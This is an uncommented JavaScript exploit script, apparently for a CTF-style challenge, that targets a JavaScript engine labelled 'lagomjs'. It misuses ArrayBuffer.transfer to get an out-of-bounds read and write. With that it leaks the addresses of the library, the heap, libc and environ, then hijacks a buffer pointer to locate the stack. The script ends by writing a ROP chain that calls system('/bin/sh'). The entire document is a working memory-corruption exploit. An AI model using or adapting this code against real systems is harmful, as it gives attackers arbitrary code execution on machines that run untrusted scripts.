a = new ArrayBuffer(0x108)
b = new BigUint64Array(a)
b[4] = BigInt("0x22000") // m_size
b[5] = BigInt("0x1") // m_inline
b[6] = BigInt("0x1") // type enum Variant<Empty, ByteBuffer, ByteBuffer*> byte_buffer;

c = a.transfer(0x10)
d = new BigUint64Array(c)
liblagomjs = Number(d[8]) - 0xbda8
heap = Number(d[10])

e = new ArrayBuffer(0x1000)
f = new Uint32Array(e)

let i = 0

for (i = 0; i < 0x1000/4; ++i) {f[i] = 0x41414141}

for (i = 0; i < 0x22000/8; ++i) {
    if (Number(d[i]) === 0x4141414141414141 && Number(d[i+1]) === 0x4141414141414141 && Number(d[i+2]) === 0x4141414141414141 && Number(d[i+3]) === 0x4141414141414141) {
        break
    }
}

e.transfer(0x1500)

// libc 2.38
libc = Number(d[i+1]) - 0x25dd00
environ = libc + 0x265258

console.log("lagomjs    @ 0x"+liblagomjs.toString(16))
console.log("heap       @ 0x"+heap.toString(16))
console.log("libc       @ 0x"+libc.toString(16))
console.log("environ    @ 0x"+environ.toString(16))

g = new ArrayBuffer(0x20)
h = new Uint32Array(g)

h[0] = 0x42424242
h[1] = 0x42424242
h[2] = 0x42424242
h[3] = 0x42424242
h[4] = 0x42424242
h[5] = 0x42424242
h[6] = 0x42424242
h[7] = 0x42424242
h[8] = 0x42424242

for (i = 0; i < 0x22000/8; ++i) {
    if (Number(d[i]) === 0x4242424242424242 && Number(d[i+1]) === 0x4242424242424242 && Number(d[i+2]) === 0x4242424242424242 && Number(d[i+3]) === 0x4242424242424242) {
        break
    }
}

m_outline_buffer_offset = i
m_outline_capacity_offset = i + 1
m_size = i + 4
m_inline = i + 5
m_index = i + 6

d[m_outline_buffer_offset] = BigInt(environ)
d[m_outline_capacity_offset] = BigInt(0x20)
d[m_outline_capacity_offset+1] = BigInt(0)
d[m_outline_capacity_offset+2] = BigInt(0)
d[m_size] = BigInt(0x20)
d[m_inline] = BigInt(0)
d[m_index] = BigInt(1)

stack = (BigInt(h[1]) << BigInt(32)) + BigInt(h[0]) - BigInt(0x228)

console.log("stack      @ 0x"+stack.toString(16))

system = 0x55230 + libc
sh = 0x1c041b + libc
pop_rdi = 0x28715 + libc
console.log("system     @ 0x"+system.toString(16))
console.log("sh         @ 0x"+sh.toString(16))
console.log("pop_rdi    @ 0x"+pop_rdi.toString(16))

d[m_outline_buffer_offset] = stack
d[m_outline_capacity_offset] = BigInt(0x20)
d[m_outline_capacity_offset+1] = BigInt(0)
d[m_outline_capacity_offset+2] = BigInt(0)
d[m_size] = BigInt(0x20)
d[m_inline] = BigInt(0)
d[m_index] = BigInt(1)

h[0] = ((pop_rdi+1) & 0xffffffff)
h[1] = Number(BigInt(pop_rdi+1) >> BigInt(32))
h[2] = (pop_rdi & 0xffffffff)
h[3] = Number(BigInt(pop_rdi) >> BigInt(32))
h[4] = (sh & 0xffffffff)
h[5] = Number(BigInt(sh) >> BigInt(32))
h[6] = (system & 0xffffffff)
h[7] = Number(BigInt(system) >> BigInt(32))